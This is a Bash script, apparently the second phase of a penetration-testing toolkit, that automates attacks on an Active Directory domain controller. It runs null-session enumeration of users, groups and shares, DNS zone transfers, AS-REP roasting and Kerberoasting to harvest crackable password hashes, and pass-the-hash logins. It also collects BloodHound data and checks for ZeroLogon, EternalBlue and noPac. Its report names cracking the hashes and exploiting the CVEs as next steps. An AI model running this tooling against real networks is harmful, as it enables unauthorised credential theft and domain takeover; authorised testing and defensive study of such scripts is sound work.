#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
cat << "EOF"
    ____  __                       ___          ______                                 __  _           
   / __ \/ /_  ____ _________     |__ \        / ____/___  __  ______ ___  ___  _________ _/ /_(_)___  ____ 
  / /_/ / __ \/ __ `/ ___/ _ \    __/ /       / __/ / __ \/ / / / __ `__ \/ _ \/ ___/ __ `/ __/ / __ \/ __ \
 / ____/ / / / /_/ (__  )  __/   / __/       / /___/ / / / /_/ / / / / / /  __/ /  / /_/ / /_/ / /_/ / / / /
/_/   /_/ /_/\__,_/____/\___/   /____/______/_____/_/ /_/\__,_/_/ /_/ /_/\___/_/   \__,_/\__/_/\____/_/ /_/ 
                                     /_____/                                                                  
EOF
echo -e "${NC}"
echo -e "${CYAN}Active Directory Comprehensive Enumeration${NC}\n"

# Load configuration from Phase 1
CONFIG_FILE="ad_target.conf"

if [ ! -f "$CONFIG_FILE" ]; then
    echo -e "${RED}[!] Configuration file not found: $CONFIG_FILE${NC}"
    echo -e "${YELLOW}[!] Please run Phase 1 (ad_discovery_phase1.sh) first${NC}"
    exit 1
fi

source "$CONFIG_FILE"

echo -e "${GREEN}[+] Loaded Configuration:${NC}"
echo -e "    ${YELLOW}DC IP:${NC} $DC_IP"
echo -e "    ${YELLOW}DC Name:${NC} $DC_NAME"
echo -e "    ${YELLOW}Domain:${NC} $DOMAIN"
echo -e "    ${YELLOW}Base DN:${NC} $BASE_DN"
echo ""

# Get credentials
echo -e "${BLUE}[*] Authentication Method:${NC}"
echo "  [1] Unauthenticated (anonymous/null session)"
echo "  [2] Username + Password"
echo "  [3] Username + NTLM Hash"
read -p "Choice [1/2/3]: " auth_choice

USERNAME=""
PASSWORD=""
HASH=""

case $auth_choice in
    1)
        echo -e "${YELLOW}[*] Running unauthenticated enumeration${NC}\n"
        ;;
    2)
        read -p "Username (e.g., administrator or DOMAIN\\user): " USERNAME
        read -sp "Password: " PASSWORD
        echo ""
        ;;
    3)
        read -p "Username (e.g., administrator or DOMAIN\\user): " USERNAME
        read -p "NTLM Hash: " HASH
        ;;
    *)
        echo -e "${RED}[!] Invalid choice${NC}"
        exit 1
        ;;
esac

# Setup output directory
OUTPUT_DIR="ad_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"/{users,groups,computers,shares,vulnerabilities,kerberos,bloodhound,misc}

# Create commands log file
COMMANDS_LOG="$OUTPUT_DIR/COMMANDS_EXECUTED.txt"
echo "========================================" > "$COMMANDS_LOG"
echo "  AD ENUMERATION - COMMANDS LOG" >> "$COMMANDS_LOG"
echo "========================================" >> "$COMMANDS_LOG"
echo "Generated: $(date)" >> "$COMMANDS_LOG"
echo "Target: $DC_IP ($DOMAIN)" >> "$COMMANDS_LOG"
echo "========================================" >> "$COMMANDS_LOG"
echo "" >> "$COMMANDS_LOG"

echo -e "${GREEN}[+] Output directory: ${YELLOW}$OUTPUT_DIR${NC}\n"

# Helper function to print command info
print_cmd() {
    local desc="$1"
    local cmd="$2"
    echo -e "${MAGENTA}[>>] $desc${NC}"
    echo -e "${CYAN}    CMD: ${NC}$cmd"
    
    # Log to commands file
    echo "========================================" >> "$COMMANDS_LOG"
    echo "[+] $desc" >> "$COMMANDS_LOG"
    echo "CMD: $cmd" >> "$COMMANDS_LOG"
    echo "TIME: $(date '+%Y-%m-%d %H:%M:%S')" >> "$COMMANDS_LOG"
    echo "" >> "$COMMANDS_LOG"
}

# ========================================
# PHASE 2.1: UNAUTHENTICATED ENUMERATION
# ========================================

echo -e "${BLUE}========================================"
echo -e "  UNAUTHENTICATED ENUMERATION"
echo -e "========================================${NC}\n"

# 1. RPC User Enumeration
print_cmd "RPC User Enumeration" "rpcclient -U \"\" -N $DC_IP -c \"enumdomusers\""
echo -e "${CYAN}    DESC:${NC} Enumerate domain users via RPC null session"
echo ""
rpcclient -U "" -N $DC_IP -c "enumdomusers" 2>/dev/null | tee "$OUTPUT_DIR/users/rpc_users.txt"
echo ""

# 2. RPC Group Enumeration
print_cmd "RPC Group Enumeration" "rpcclient -U \"\" -N $DC_IP -c \"enumdomgroups\""
echo -e "${CYAN}    DESC:${NC} Enumerate domain groups via RPC null session"
echo ""
rpcclient -U "" -N $DC_IP -c "enumdomgroups" 2>/dev/null | tee "$OUTPUT_DIR/groups/rpc_groups.txt"
echo ""

# 3. SMB Shares Enumeration
print_cmd "SMB Share Enumeration" "smbclient -L //$DC_IP -N"
echo -e "${CYAN}    DESC:${NC} List available SMB shares using null session"
echo ""
smbclient -L //$DC_IP -N 2>/dev/null | tee "$OUTPUT_DIR/shares/smbclient_shares.txt"
echo ""

# 4. LDAP Anonymous Bind Check
print_cmd "LDAP Anonymous Bind Test" "ldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" -s base"
echo -e "${CYAN}    DESC:${NC} Test if LDAP allows anonymous binding and query root DSE"
echo ""
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" -s base "(objectclass=*)" 2>/dev/null | tee "$OUTPUT_DIR/misc/ldap_rootdse.txt"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] LDAP anonymous bind allowed!${NC}\n"
    
    # 5. LDAP User Enumeration
    print_cmd "LDAP User Enumeration" "ldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" \"(objectClass=user)\""
    echo -e "${CYAN}    DESC:${NC} Enumerate all user objects via anonymous LDAP"
    echo ""
    ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" "(objectClass=user)" sAMAccountName userPrincipalName description 2>/dev/null | \
        grep -E "sAMAccountName|userPrincipalName|description" | tee "$OUTPUT_DIR/users/ldap_users.txt"
    echo ""
    
    # 6. LDAP Computer Enumeration
    print_cmd "LDAP Computer Enumeration" "ldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" \"(objectClass=computer)\""
    echo -e "${CYAN}    DESC:${NC} Enumerate all computer objects via anonymous LDAP"
    echo ""
    ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" "(objectClass=computer)" name operatingSystem 2>/dev/null | \
        grep -E "^name:|operatingSystem:" | tee "$OUTPUT_DIR/computers/ldap_computers.txt"
    echo ""
    
    # 7. LDAP Group Enumeration
    print_cmd "LDAP Group Enumeration" "ldapsearch -x -H ldap://$DC_IP -b \"$BASE_DN\" \"(objectClass=group)\""
    echo -e "${CYAN}    DESC:${NC} Enumerate all group objects via anonymous LDAP"
    echo ""
    ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" "(objectClass=group)" sAMAccountName member 2>/dev/null | \
        grep -E "sAMAccountName|member:" | tee "$OUTPUT_DIR/groups/ldap_groups.txt"
    echo ""
else
    echo -e "${RED}[!] LDAP anonymous bind not allowed${NC}\n"
fi

# 8. DNS Zone Transfer Attempt
print_cmd "DNS Zone Transfer" "dig axfr @$DC_IP $DOMAIN"
echo -e "${CYAN}    DESC:${NC} Attempt DNS zone transfer to dump all DNS records"
echo ""
dig axfr @$DC_IP $DOMAIN 2>/dev/null | tee "$OUTPUT_DIR/misc/dns_zone_transfer.txt"
if grep -q "Transfer failed" "$OUTPUT_DIR/misc/dns_zone_transfer.txt"; then
    echo -e "${RED}[!] DNS zone transfer denied${NC}\n"
else
    echo -e "${GREEN}[+] DNS zone transfer successful!${NC}\n"
fi

# 9. DNS SRV Record Enumeration
print_cmd "DNS SRV Records" "dig @$DC_IP _ldap._tcp.$DOMAIN SRV"
echo -e "${CYAN}    DESC:${NC} Enumerate AD service records (LDAP, Kerberos, GC, etc.)"
echo ""
for service in _ldap._tcp _kerberos._tcp _kpasswd._tcp _gc._tcp; do
    echo -e "${YELLOW}[*] Querying: $service.$DOMAIN${NC}"
    dig @$DC_IP ${service}.${DOMAIN} SRV +short 2>/dev/null | tee -a "$OUTPUT_DIR/misc/dns_srv_records.txt"
done
echo ""

# 10. enum4linux-ng (if available)
if command -v enum4linux-ng &> /dev/null; then
    print_cmd "Comprehensive SMB/RPC Enumeration" "enum4linux-ng -A $DC_IP"
    echo -e "${CYAN}    DESC:${NC} All-in-one SMB/RPC enumeration (users, groups, shares, policies)"
    echo ""
    enum4linux-ng -A $DC_IP -oY "$OUTPUT_DIR/misc/enum4linux.yaml" 2>/dev/null | tee "$OUTPUT_DIR/misc/enum4linux.txt"
    echo ""
fi

# 11. CrackMapExec SMB Enumeration
if command -v crackmapexec &> /dev/null; then
    print_cmd "CrackMapExec Null Session" "crackmapexec smb $DC_IP --shares --users --groups"
    echo -e "${CYAN}    DESC:${NC} Enumerate shares, users, and groups via SMB null session"
    echo ""
    
    crackmapexec smb $DC_IP --shares 2>/dev/null | tee "$OUTPUT_DIR/shares/cme_shares_null.txt"
    crackmapexec smb $DC_IP --users 2>/dev/null | tee "$OUTPUT_DIR/users/cme_users_null.txt"
    crackmapexec smb $DC_IP --groups 2>/dev/null | tee "$OUTPUT_DIR/groups/cme_groups_null.txt"
    echo ""
fi

# 12. ASREPRoast (Unauthenticated)
# First create userlist from discovered users
if [ -f "$OUTPUT_DIR/users/ldap_users.txt" ]; then
    grep "sAMAccountName:" "$OUTPUT_DIR/users/ldap_users.txt" | awk '{print $2}' > "$OUTPUT_DIR/users/userlist.txt"
elif [ -f "$OUTPUT_DIR/users/rpc_users.txt" ]; then
    grep "user:" "$OUTPUT_DIR/users/rpc_users.txt" | awk -F'[][]' '{print $2}' > "$OUTPUT_DIR/users/userlist.txt"
fi

if [ -f "$OUTPUT_DIR/users/userlist.txt" ] && [ -s "$OUTPUT_DIR/users/userlist.txt" ]; then
    if command -v impacket-GetNPUsers &> /dev/null; then
        print_cmd "ASREPRoasting" "impacket-GetNPUsers ${DOMAIN}/ -usersfile userlist.txt -dc-ip $DC_IP -no-pass"
        echo -e "${CYAN}    DESC:${NC} Find accounts with Kerberos pre-authentication disabled (AS-REP Roastable)"
        echo ""
        impacket-GetNPUsers ${DOMAIN}/ -usersfile "$OUTPUT_DIR/users/userlist.txt" -dc-ip $DC_IP -no-pass 2>/dev/null | \
            tee "$OUTPUT_DIR/kerberos/asreproast.txt"
        echo ""
    fi
fi

# ========================================
# PHASE 2.2: AUTHENTICATED ENUMERATION
# ========================================

if [ ! -z "$USERNAME" ]; then
    echo -e "${BLUE}========================================"
    echo -e "  AUTHENTICATED ENUMERATION"
    echo -e "========================================${NC}\n"
    
    # Setup credentials for commands
    CME_CREDS=""
    LDAP_CREDS=""
    IMPACKET_CREDS=""
    
    if [ ! -z "$PASSWORD" ]; then
        CME_CREDS="-u '$USERNAME' -p '$PASSWORD'"
        LDAP_CREDS="-D '$USERNAME' -w '$PASSWORD'"
        IMPACKET_CREDS="${DOMAIN}/${USERNAME}:${PASSWORD}"
    elif [ ! -z "$HASH" ]; then
        CME_CREDS="-u '$USERNAME' -H '$HASH'"
        IMPACKET_CREDS="${DOMAIN}/${USERNAME} -hashes :${HASH}"
    fi
    
    # 1. Domain User Enumeration
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        print_cmd "Domain User Enumeration" "crackmapexec ldap $DC_IP $CME_CREDS --users"
        echo -e "${CYAN}    DESC:${NC} Enumerate all domain users with authenticated access"
        echo ""
        eval "crackmapexec ldap $DC_IP $CME_CREDS --users" 2>/dev/null | tee "$OUTPUT_DIR/users/cme_all_users.txt"
        echo ""
    fi
    
    # 2. Password in Description
    print_cmd "Users with Password in Description" "crackmapexec ldap $DC_IP $CME_CREDS --users | grep -i password"
    echo -e "${CYAN}    DESC:${NC} Find users with passwords stored in description field"
    echo ""
    if [ -f "$OUTPUT_DIR/users/cme_all_users.txt" ]; then
        grep -i password "$OUTPUT_DIR/users/cme_all_users.txt" | tee "$OUTPUT_DIR/users/users_password_desc.txt"
    fi
    echo ""
    
    # 3. Domain Group Enumeration
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        print_cmd "Domain Group Enumeration" "crackmapexec ldap $DC_IP $CME_CREDS --groups"
        echo -e "${CYAN}    DESC:${NC} Enumerate all domain groups"
        echo ""
        eval "crackmapexec ldap $DC_IP $CME_CREDS --groups" 2>/dev/null | tee "$OUTPUT_DIR/groups/cme_all_groups.txt"
        echo ""
    fi
    
    # 4. Privileged Groups
    print_cmd "Privileged Group Members" "ldapsearch -x -H ldap://$DC_IP $LDAP_CREDS -b \"$BASE_DN\" \"(cn=Domain Admins)\""
    echo -e "${CYAN}    DESC:${NC} Enumerate members of privileged groups (Domain Admins, Enterprise Admins, etc.)"
    echo ""
    
    for group in "Domain Admins" "Enterprise Admins" "Administrators" "Account Operators" "Backup Operators" "Server Operators" "Schema Admins"; do
        echo -e "${YELLOW}[*] Group: $group${NC}"
        if [ ! -z "$PASSWORD" ]; then
            ldapsearch -x -H ldap://$DC_IP -D "${USERNAME}" -w "${PASSWORD}" -b "$BASE_DN" \
                "(&(objectClass=group)(cn=$group))" member 2>/dev/null | grep "member:" | tee -a "$OUTPUT_DIR/groups/privileged_groups.txt"
        fi
    done
    echo ""
    
    # 5. Domain Computer Enumeration
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        print_cmd "Domain Computer Enumeration" "crackmapexec ldap $DC_IP $CME_CREDS --computers"
        echo -e "${CYAN}    DESC:${NC} Enumerate all domain computers with OS details"
        echo ""
        eval "crackmapexec ldap $DC_IP $CME_CREDS --computers" 2>/dev/null | tee "$OUTPUT_DIR/computers/cme_all_computers.txt"
        echo ""
    fi
    
    # 6. Detailed Computer Info via LDAP
    if [ ! -z "$PASSWORD" ]; then
        print_cmd "Detailed Computer Information" "ldapsearch -x -H ldap://$DC_IP $LDAP_CREDS -b \"$BASE_DN\" \"(objectClass=computer)\""
        echo -e "${CYAN}    DESC:${NC} Get detailed computer attributes (OS, version, DNS name)"
        echo ""
        ldapsearch -x -H ldap://$DC_IP -D "${USERNAME}" -w "${PASSWORD}" -b "$BASE_DN" \
            "(objectClass=computer)" name operatingSystem operatingSystemVersion dNSHostName \
            2>/dev/null | grep -E "^name:|operatingSystem|dNSHostName:" | tee "$OUTPUT_DIR/computers/ldap_computers_detailed.txt"
        echo ""
    fi
    
    # 7. Kerberoasting
    if command -v impacket-GetUserSPNs &> /dev/null && [ ! -z "$IMPACKET_CREDS" ]; then
        print_cmd "Kerberoasting (SPN Enumeration)" "impacket-GetUserSPNs $IMPACKET_CREDS -dc-ip $DC_IP -request"
        echo -e "${CYAN}    DESC:${NC} Extract TGS tickets for accounts with SPNs (Kerberoast attack)"
        echo ""
        
        if [ ! -z "$PASSWORD" ]; then
            impacket-GetUserSPNs "${DOMAIN}/${USERNAME}:${PASSWORD}" -dc-ip $DC_IP -request 2>/dev/null | \
                tee "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt"
        elif [ ! -z "$HASH" ]; then
            impacket-GetUserSPNs "${DOMAIN}/${USERNAME}" -hashes ":${HASH}" -dc-ip $DC_IP -request 2>/dev/null | \
                tee "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt"
        fi
        echo ""
    fi
    
    # 8. Share Enumeration with Authentication
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        print_cmd "Authenticated Share Enumeration" "crackmapexec smb $DC_IP $CME_CREDS --shares"
        echo -e "${CYAN}    DESC:${NC} List all SMB shares with read/write permissions"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS --shares" 2>/dev/null | tee "$OUTPUT_DIR/shares/cme_shares_auth.txt"
        echo ""
        
        # Spider SYSVOL
        print_cmd "SYSVOL Spider" "crackmapexec smb $DC_IP $CME_CREDS --spider SYSVOL --pattern txt,xml,ini,bat,ps1"
        echo -e "${CYAN}    DESC:${NC} Search SYSVOL for scripts and configuration files"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS --spider SYSVOL --pattern txt,xml,ini,bat,ps1" 2>/dev/null | \
            tee "$OUTPUT_DIR/shares/sysvol_spider.txt"
        echo ""
    fi
    
    # 9. Domain Trust Enumeration
    if [ ! -z "$PASSWORD" ]; then
        print_cmd "Domain Trust Enumeration" "ldapsearch -x -H ldap://$DC_IP $LDAP_CREDS -b \"$BASE_DN\" \"(objectClass=trustedDomain)\""
        echo -e "${CYAN}    DESC:${NC} Enumerate domain trusts (if any)"
        echo ""
        ldapsearch -x -H ldap://$DC_IP -D "${USERNAME}" -w "${PASSWORD}" -b "$BASE_DN" \
            "(objectClass=trustedDomain)" trustPartner trustDirection trustType 2>/dev/null | \
            grep -E "trustPartner|trustDirection|trustType" | tee "$OUTPUT_DIR/misc/domain_trusts.txt"
        echo ""
    fi
    
    # 9.5. Password Policy
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        print_cmd "Password Policy" "crackmapexec smb $DC_IP $CME_CREDS --pass-pol"
        echo -e "${CYAN}    DESC:${NC} Get domain password policy (complexity, length, lockout)"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS --pass-pol" 2>/dev/null | tee "$OUTPUT_DIR/misc/password_policy.txt"
        echo ""
    fi
    
    # 9.6. Domain Functional Level
    if [ ! -z "$PASSWORD" ]; then
        print_cmd "Domain Functional Level" "ldapsearch -x -H ldap://$DC_IP $LDAP_CREDS -b \"$BASE_DN\" -s base"
        echo -e "${CYAN}    DESC:${NC} Get domain and forest functional levels"
        echo ""
        ldapsearch -x -H ldap://$DC_IP -D "${USERNAME}" -w "${PASSWORD}" -b "$BASE_DN" -s base \
            domainFunctionality forestFunctionality msDS-Behavior-Version 2>/dev/null | \
            grep -E "domainFunctionality|forestFunctionality|msDS-Behavior-Version|whenCreated" | tee "$OUTPUT_DIR/misc/domain_info.txt"
        echo ""
    fi
    
    # 10. GPO Enumeration
    if [ ! -z "$PASSWORD" ]; then
        print_cmd "Group Policy Objects" "ldapsearch -x -H ldap://$DC_IP $LDAP_CREDS -b \"$BASE_DN\" \"(objectClass=groupPolicyContainer)\""
        echo -e "${CYAN}    DESC:${NC} Enumerate Group Policy Objects"
        echo ""
        ldapsearch -x -H ldap://$DC_IP -D "${USERNAME}" -w "${PASSWORD}" -b "$BASE_DN" \
            "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath 2>/dev/null | \
            grep -E "displayName|gPCFileSysPath" | tee "$OUTPUT_DIR/misc/gpo_list.txt"
        echo ""
    fi
    
    # 11. BloodHound Collection
    if command -v bloodhound-python &> /dev/null; then
        print_cmd "BloodHound Data Collection" "bloodhound-python -d $DOMAIN -u $USERNAME -p *** -ns $DC_IP -c All --zip"
        echo -e "${CYAN}    DESC:${NC} Collect AD data for BloodHound attack path analysis"
        echo ""
        
        # Change to bloodhound directory before running
        cd "$OUTPUT_DIR/bloodhound/" || exit 1
        
        if [ ! -z "$PASSWORD" ]; then
            bloodhound-python -d $DOMAIN -u "$USERNAME" -p "$PASSWORD" -ns $DC_IP -c All --zip 2>&1 | tee collection.log
        elif [ ! -z "$HASH" ]; then
            bloodhound-python -d $DOMAIN -u "$USERNAME" --hashes ":${HASH}" -ns $DC_IP -c All --zip 2>&1 | tee collection.log
        fi
        
        # Return to main directory
        cd - > /dev/null
        
        # Check if files were created
        if ls "$OUTPUT_DIR/bloodhound/"*.zip 1> /dev/null 2>&1; then
            echo -e "${GREEN}[+] BloodHound data collected successfully${NC}\n"
        else
            echo -e "${RED}[!] BloodHound collection may have failed - check $OUTPUT_DIR/bloodhound/collection.log${NC}\n"
        fi
    else
        echo -e "${YELLOW}[!] bloodhound-python not found, skipping${NC}\n"
    fi
    
    # 12. Vulnerability Scanning
    
    # First, test if CrackMapExec modules can load
    cme_modules_work=false
    if command -v crackmapexec &> /dev/null && [ ! -z "$CME_CREDS" ]; then
        echo -e "${BLUE}[*] Testing CrackMapExec module availability...${NC}"
        test_output=$(crackmapexec smb $DC_IP $CME_CREDS -M test 2>&1)
        
        if echo "$test_output" | grep -q "No module named 'pylnk3'"; then
            echo -e "${RED}[!] CrackMapExec modules cannot load - missing pylnk3 dependency${NC}"
            echo -e "${YELLOW}[!] To fix: pip3 install pylnk3 --break-system-packages${NC}"
            echo -e "${YELLOW}[!] Falling back to Nmap for vulnerability scanning${NC}\n"
            
            # Log the issue
            echo "[!] CrackMapExec modules disabled due to missing pylnk3" | tee "$OUTPUT_DIR/vulnerabilities/cme_status.txt"
            echo "[*] Fix: pip3 install pylnk3 --break-system-packages" | tee -a "$OUTPUT_DIR/vulnerabilities/cme_status.txt"
        elif ! echo "$test_output" | grep -q "Module not found"; then
            cme_modules_work=true
        fi
    fi
    
    # Only run CME checks if modules work
    if [ "$cme_modules_work" = true ]; then
        echo -e "${MAGENTA}[>>] Vulnerability Checks (CrackMapExec)${NC}\n"
        
        # MS17-010
        print_cmd "MS17-010 (EternalBlue)" "crackmapexec smb $DC_IP $CME_CREDS -M ms17-010"
        echo -e "${CYAN}    DESC:${NC} Check for MS17-010 SMB vulnerability (EternalBlue)"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS -M ms17-010" 2>&1 | tee "$OUTPUT_DIR/vulnerabilities/ms17-010_cme.txt"
        echo ""
        
        # ZeroLogon
        print_cmd "ZeroLogon (CVE-2020-1472)" "crackmapexec smb $DC_IP $CME_CREDS -M zerologon"
        echo -e "${CYAN}    DESC:${NC} Check for ZeroLogon vulnerability (Netlogon elevation)"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS -M zerologon" 2>&1 | tee "$OUTPUT_DIR/vulnerabilities/zerologon_cme.txt"
        echo ""
        
        # PetitPotam
        print_cmd "PetitPotam" "crackmapexec smb $DC_IP $CME_CREDS -M petitpotam"
        echo -e "${CYAN}    DESC:${NC} Check for PetitPotam NTLM relay vulnerability"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS -M petitpotam" 2>&1 | tee "$OUTPUT_DIR/vulnerabilities/petitpotam_cme.txt"
        echo ""
        
        # noPac
        print_cmd "noPac (CVE-2021-42278/42287)" "crackmapexec smb $DC_IP $CME_CREDS -M nopac"
        echo -e "${CYAN}    DESC:${NC} Check for noPac privilege escalation vulnerability"
        echo ""
        eval "crackmapexec smb $DC_IP $CME_CREDS -M nopac" 2>&1 | tee "$OUTPUT_DIR/vulnerabilities/nopac_cme.txt"
        echo ""
    fi
    
    # Nmap-based vulnerability checks (primary method when CME fails)
    if command -v nmap &> /dev/null; then
        echo -e "${MAGENTA}[>>] Vulnerability Checks (Nmap NSE)${NC}\n"
        
        # MS17-010 EternalBlue
        print_cmd "MS17-010 EternalBlue Check" "nmap -p445 --script smb-vuln-ms17-010 $DC_IP"
        echo -e "${CYAN}    DESC:${NC} Check for MS17-010 (EternalBlue) SMB vulnerability"
        echo ""
        sudo nmap -p445 --script smb-vuln-ms17-010 $DC_IP 2>/dev/null | tee "$OUTPUT_DIR/vulnerabilities/ms17-010_nmap.txt"
        echo ""
        
        # MS08-067
        print_cmd "MS08-067 Check" "nmap -p445 --script smb-vuln-ms08-067 $DC_IP"
        echo -e "${CYAN}    DESC:${NC} Check for MS08-067 SMB vulnerability"
        echo ""
        sudo nmap -p445 --script smb-vuln-ms08-067 $DC_IP 2>/dev/null | tee "$OUTPUT_DIR/vulnerabilities/ms08-067_nmap.txt"
        echo ""
        
        # SMB Signing
        print_cmd "SMB Signing Check" "nmap -p445 --script smb-security-mode,smb2-security-mode $DC_IP"
        echo -e "${CYAN}    DESC:${NC} Check SMB signing configuration (important for relay attacks)"
        echo ""
        sudo nmap -p445 --script smb-security-mode,smb2-security-mode $DC_IP 2>/dev/null | tee "$OUTPUT_DIR/vulnerabilities/smb_signing.txt"
        echo ""
        
        # Comprehensive SMB vulns
        print_cmd "Comprehensive SMB Vulnerabilities" "nmap -p445 --script smb-vuln* $DC_IP"
        echo -e "${CYAN}    DESC:${NC} Run all SMB vulnerability checks"
        echo ""
        sudo nmap -p445 --script smb-vuln* $DC_IP 2>/dev/null | tee "$OUTPUT_DIR/vulnerabilities/smb_all_vulns.txt"
        echo ""
        
        echo -e "${GREEN}[+] Nmap vulnerability scans completed${NC}\n"
    fi
fi

# ========================================
# GENERATE SUMMARY REPORT
# ========================================

echo -e "${BLUE}========================================"
echo -e "  GENERATING SUMMARY REPORT"
echo -e "========================================${NC}\n"

REPORT="$OUTPUT_DIR/ENUMERATION_REPORT.txt"

cat > "$REPORT" << EOF
================================================================================
          ACTIVE DIRECTORY ENUMERATION REPORT
================================================================================
Generated: $(date)
Domain: $DOMAIN ($DOMAIN_SHORT)
Domain Controller: $DC_NAME
DC IP Address: $DC_IP
Base DN: $BASE_DN
Authentication: $([ -z "$USERNAME" ] && echo "Unauthenticated" || echo "Authenticated as $USERNAME")
================================================================================

STATISTICS:
================================================================================

EOF

# Count users
if [ -f "$OUTPUT_DIR/users/userlist.txt" ]; then
    user_count=$(wc -l < "$OUTPUT_DIR/users/userlist.txt" 2>/dev/null)
    echo "[+] Total Users Found: $user_count" >> "$REPORT"
fi

# Count computers
if [ -f "$OUTPUT_DIR/computers/ldap_computers.txt" ]; then
    computer_count=$(grep -c "^name:" "$OUTPUT_DIR/computers/ldap_computers.txt" 2>/dev/null || echo "0")
    echo "[+] Total Computers Found: $computer_count" >> "$REPORT"
fi

# Count groups
if [ -f "$OUTPUT_DIR/groups/ldap_groups.txt" ]; then
    group_count=$(grep -c "sAMAccountName:" "$OUTPUT_DIR/groups/ldap_groups.txt" 2>/dev/null || echo "0")
    echo "[+] Total Groups Found: $group_count" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "================================================================================
CRITICAL FINDINGS (POTENTIAL ATTACK VECTORS):
================================================================================" >> "$REPORT"
echo "" >> "$REPORT"

critical_found=0

# ASREPRoast findings
if [ -f "$OUTPUT_DIR/kerberos/asreproast.txt" ]; then
    asrep_count=$(grep -c '$krb5asrep$' "$OUTPUT_DIR/kerberos/asreproast.txt" 2>/dev/null || echo "0")
    if [ "$asrep_count" -gt 0 ]; then
        echo "[!] HIGH - ASREPRoastable Accounts: $asrep_count" >> "$REPORT"
        echo "    Accounts without Kerberos pre-authentication - can be cracked offline" >> "$REPORT"
        echo "    Location: kerberos/asreproast.txt" >> "$REPORT"
        echo "" >> "$REPORT"
        critical_found=1
    fi
fi

# Kerberoast findings
if [ -f "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt" ]; then
    kerberoast_count=$(grep -c '$krb5tgs$' "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt" 2>/dev/null || echo "0")
    if [ "$kerberoast_count" -gt 0 ]; then
        echo "[!] HIGH - Kerberoastable Accounts: $kerberoast_count" >> "$REPORT"
        echo "    Service accounts with SPNs - TGS hashes can be cracked offline" >> "$REPORT"
        echo "    Location: kerberos/kerberoast_hashes.txt" >> "$REPORT"
        echo "" >> "$REPORT"
        critical_found=1
    fi
fi

# Password in description
if [ -f "$OUTPUT_DIR/users/users_password_desc.txt" ] && [ -s "$OUTPUT_DIR/users/users_password_desc.txt" ]; then
    pwd_desc_count=$(wc -l < "$OUTPUT_DIR/users/users_password_desc.txt")
    echo "[!] CRITICAL - Users with 'password' in description: $pwd_desc_count" >> "$REPORT"
    echo "    Potential credentials exposed in user descriptions" >> "$REPORT"
    echo "    Location: users/users_password_desc.txt" >> "$REPORT"
    echo "" >> "$REPORT"
    critical_found=1
fi

# DNS zone transfer
if [ -f "$OUTPUT_DIR/misc/dns_zone_transfer.txt" ]; then
    if ! grep -q "Transfer failed" "$OUTPUT_DIR/misc/dns_zone_transfer.txt" && ! grep -q "connection timed out" "$OUTPUT_DIR/misc/dns_zone_transfer.txt"; then
        echo "[!] MEDIUM - DNS Zone Transfer: ALLOWED" >> "$REPORT"
        echo "    Full DNS records can be dumped - aids in reconnaissance" >> "$REPORT"
        echo "    Location: misc/dns_zone_transfer.txt" >> "$REPORT"
        echo "" >> "$REPORT"
        critical_found=1
    fi
fi

# LDAP anonymous bind
if [ -f "$OUTPUT_DIR/misc/ldap_rootdse.txt" ] && [ -s "$OUTPUT_DIR/misc/ldap_rootdse.txt" ]; then
    echo "[!] MEDIUM - LDAP Anonymous Bind: ALLOWED" >> "$REPORT"
    echo "    Unauthenticated access to directory information" >> "$REPORT"
    echo "    Location: misc/ldap_rootdse.txt" >> "$REPORT"
    echo "" >> "$REPORT"
    critical_found=1
fi

# Check for privileged users in kerberoast
if [ -f "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt" ]; then
    if grep -qi "domain admin\|backup\|administrator" "$OUTPUT_DIR/kerberos/kerberoast_hashes.txt"; then
        echo "[!] CRITICAL - Privileged Accounts are Kerberoastable!" >> "$REPORT"
        echo "    High-value accounts with SPNs detected" >> "$REPORT"
        echo "    Location: kerberos/kerberoast_hashes.txt" >> "$REPORT"
        echo "" >> "$REPORT"
        critical_found=1
    fi
fi

if [ $critical_found -eq 0 ]; then
    echo "[*] No critical findings detected in automated checks" >> "$REPORT"
    echo "" >> "$REPORT"
fi

echo "" >> "$REPORT"
echo "================================================================================
OUTPUT DIRECTORY STRUCTURE:
================================================================================" >> "$REPORT"

tree -L 2 "$OUTPUT_DIR" >> "$REPORT" 2>/dev/null || find "$OUTPUT_DIR" -type d >> "$REPORT"

echo "" >> "$REPORT"
echo "================================================================================
NEXT STEPS:
================================================================================
1. Review kerberos/ folder for AS-REP and Kerberoast hashes to crack
2. Check users/users_password_desc.txt for credentials
3. Import bloodhound/ data into BloodHound for attack path analysis
4. Review shares/ for sensitive files and misconfigurations
5. Check vulnerabilities/ for exploitable CVEs
================================================================================" >> "$REPORT"

echo -e "${GREEN}[+] Summary report saved to: ${YELLOW}$REPORT${NC}\n"

# Final summary
echo -e "${BLUE}========================================"
echo -e "  ENUMERATION COMPLETE!"
